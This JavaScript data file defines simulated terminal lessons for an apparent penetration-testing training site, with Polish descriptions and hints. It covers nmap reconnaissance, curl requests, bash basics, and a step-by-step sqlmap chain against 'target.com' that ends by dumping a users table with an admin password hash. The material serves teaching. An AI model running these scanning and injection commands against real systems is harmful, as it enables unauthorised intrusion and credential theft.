// Terminal simulator scenarios for HackerLabAcademy
// Each scenario has a title, description, and sequence of steps (command -> expected output)

export const TERMINAL_SCENARIOS = [
  {
    id: 'nmap-basics',
    title: 'Skanowanie sieci nmap',
    description: 'Naucz się używać nmap doDiscover hostów i portów. Po każdej komendzie system symuluje odpowiedź.',
    steps: [
      {
        prompt: 'nmap -sP 192.168.1.0/24',
        output: `Starting Nmap scan (Ping Scan)...
Nmap scan report for 192.168.1.1
Host is up (0.0010s latency).
Nmap scan report for 192.168.1.10
Host is up (0.0025s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.45 seconds`,
      },
      {
        prompt: 'nmap -p 1-1000 192.168.1.10',
        output: `Starting Nmap scan of 192.168.1.10...
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp open   https
Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds`,
      },
      {
        prompt: 'nmap -sV -p 80 192.168.1.10',
        output: `PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service detection performed...`,
      },
    ],
    hints: ['Użyj -sP do ping sweep', 'Sprawdź porty 1-1000 z -p', 'Dodaj -sV do wykrywania wersji'],
  },
  {
    id: 'curl-basics',
    title: 'curl do testowania endpointów',
    description: 'Poznaj curl — narzędzie do HTTP requestów. Testujemy różne metody i nagłówki.',
    steps: [
      {
        prompt: 'curl http://target.com',
        output: `<html>
  <body>
    <h1>Welcome to Target</h1>
  </body>
</html>`,
      },
      {
        prompt: 'curl -I http://target.com',
        output: `HTTP/1.1 200 OK
Date: Wed, 02 Apr 2026 12:00:00 GMT
Content-Type: text/html; charset=UTF-8
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: session=abc123; Path=/; HttpOnly`,
      },
      {
        prompt: 'curl -X POST -d "username=admin&password=123" http://target.com/login',
        output: `Login failed. Invalid credentials.`,
      },
    ],
    hints: ['GET domyślnie', '-I dla HEAD', '-X dla metody, -d dla body'],
  },
  {
    id: 'bash-essentials',
    title: 'Podstawy bash',
    description: 'Nauka podstawowej nawigacji i operacji w bash.',
    steps: [
      {
        prompt: 'ls -la',
        output: `total 24
drwxr-xr-x 2 user user 4096 Apr 2 12:00 .
drwxr-xr-x 5 user user 4096 Apr 2 11:55 ..
-rw-r--r-- 1 user user  104 Apr 2 12:00 notes.txt
-rw-r--r-- 1 user user   56 Apr 2 12:00 secret.txt
-rwxr-xr-x 1 user user  120 Apr 2 12:00 script.sh`,
      },
      {
        prompt: 'cat secret.txt',
        output: `Congratulations! You found the secret: FLAG{BASH_MASTER}`,
      },
      {
        prompt: 'whoami',
        output: `user`,
      },
    ],
    hints: ['ls -la pokaże wszystkie pliki', 'cat do odczytu', 'whoami pokaże użytkownika'],
  },
  {
    id: 'sqlmap-basics',
    title: 'SQLMap - Automatyczne SQLi',
    description: 'Naucz się używać sqlmap do automatycznego wykrywania i eksploatacji SQL injection. W tym symulatorze pokazujemy podstawowe opcje.',
    steps: [
      {
        prompt: 'sqlmap -u "http://target.com/page.php?id=1"',
        output: `[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[INFO] testing if the target is vulnerable to SQL injection
[INFO] the target is vulnerable! Possible SQL injection found in parameter 'id'
[INFO] fetching database names
available databases [2]:
[*] information_schema
[*] dvwa`,
      },
      {
        prompt: 'sqlmap -u "http://target.com/page.php?id=1" --dbs',
        output: `[INFO] fetching database names:
[INFO] retrieved: information_schema
[INFO] retrieved: dvwa`,
      },
      {
        prompt: 'sqlmap -u "http://target.com/page.php?id=1" -D dvwa --tables',
        output: `[INFO] fetching tables for database: dvwa
[INFO] retrieved: users
[INFO] retrieved: guestbook`,
      },
      {
        prompt: 'sqlmap -u "http://target.com/page.php?id=1" -D dvwa -T users --columns',
        output: `[INFO] fetching columns for table 'users' in database 'dvwa'
[INFO] retrieved: user_id
[INFO] retrieved: username
[INFO] retrieved: password`,
      },
      {
        prompt: 'sqlmap -u "http://target.com/page.php?id=1" -D dvwa -T users -C user_id,username,password --dump',
        output: `[INFO] dumping table 'dvwa.users'
Database: dvwa
Table: users
[1 entries]
+---------+----------+----------------------------------+
| user_id | username | password                         |
+---------+----------+----------------------------------+
| 1       | admin     | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+----------+----------------------------------+`,
      },
    ],
    hints: [
      'Pierwsza komenda: sqlmap -u z URL z parametrem',
      '--dbs pokazuje bazy danych',
      '--tables pokazuje tabele w bazie',
      '--columns pokazuje kolumny',
      '--dump eksportuje dane',
    ],
  },
]

export const getScenario = (id) => TERMINAL_SCENARIOS.find(s => s.id === id)
export const listScenarios = () => TERMINAL_SCENARIOS
